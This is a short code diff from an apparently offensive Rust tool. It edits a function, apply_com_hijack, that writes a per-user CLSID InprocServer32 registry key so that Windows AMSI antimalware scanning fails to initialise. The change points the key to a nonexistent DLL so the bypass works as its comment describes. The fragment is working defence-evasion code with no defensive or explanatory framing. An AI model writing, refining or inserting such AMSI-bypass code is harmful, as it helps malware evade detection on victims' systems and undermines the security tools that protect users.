@@ -82,8 +82,8 @@ fn apply_com_hijack() {
     use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
 
     let subkey = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
-    // Point the hijacked CLSID to a non-existent path so AMSI COM init fails
-    let default_val = b"C:\\Windows\\System32\\amsi.dll\0";
+    // Point to a nonexistent path so AMSI COM initialisation fails cleanly (2.11)
+    let default_val = b"C:\\Windows\\System32\\amsi_disabled.dll\0";
 
     unsafe {
         let mut hkey = ptr::null_mut();
